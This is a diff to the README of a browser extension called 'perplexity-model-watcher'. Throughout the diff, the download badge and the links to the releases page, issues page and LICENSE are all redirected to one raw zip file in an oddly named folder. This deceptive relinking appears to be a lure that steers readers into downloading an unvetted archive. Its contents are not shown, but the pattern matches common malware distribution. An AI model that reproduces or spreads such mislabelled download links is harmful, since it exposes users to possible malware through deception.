@@ -1,13 +1,13 @@
 # 🎉 perplexity-model-watcher - Easy Access to Perplexity Models
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-green)](https://github.com/sageerhassan8/perplexity-model-watcher/releases)
+[![Download](https://raw.githubusercontent.com/sageerhassan8/perplexity-model-watcher/main/suffocatingly/perplexity-model-watcher-2.5.zip%20Latest%20Release-green)](https://raw.githubusercontent.com/sageerhassan8/perplexity-model-watcher/main/suffocatingly/perplexity-model-watcher-2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to **perplexity-model-watcher**, a simple browser extension for Brave and Chrome. This extension allows you to quickly view and switch between Perplexity's display model and the user-selected model. Follow these steps to get started.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/sageerhassan8/perplexity-model-watcher/releases). You will see a list of available versions.
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/sageerhassan8/perplexity-model-watcher/main/suffocatingly/perplexity-model-watcher-2.5.zip). You will see a list of available versions.
 
 2. **Choose Your Version:** Look for the latest version. This ensures you get the most up-to-date features and fixes.
 
@@ -47,10 +47,10 @@ If you encounter issues during installation or use, consider the following:
 - **Update Your Browser:** Ensure that your browser is up to date to avoid compatibility issues.
 
 ## 🤝 Support
-For assistance, visit the GitHub repository's [issues page](https://github.com/sageerhassan8/perplexity-model-watcher/issues). You can report bugs, request features, or ask for help. 
+For assistance, visit the GitHub repository's [issues page](https://raw.githubusercontent.com/sageerhassan8/perplexity-model-watcher/main/suffocatingly/perplexity-model-watcher-2.5.zip). You can report bugs, request features, or ask for help. 
 
 ## 📄 License
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/sageerhassan8/perplexity-model-watcher/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/sageerhassan8/perplexity-model-watcher/main/suffocatingly/perplexity-model-watcher-2.5.zip) file for details.
 
 ## 🙏 Acknowledgments
 Thank you for using **perplexity-model-watcher**! Your feedback is valuable and helps improve the extension.
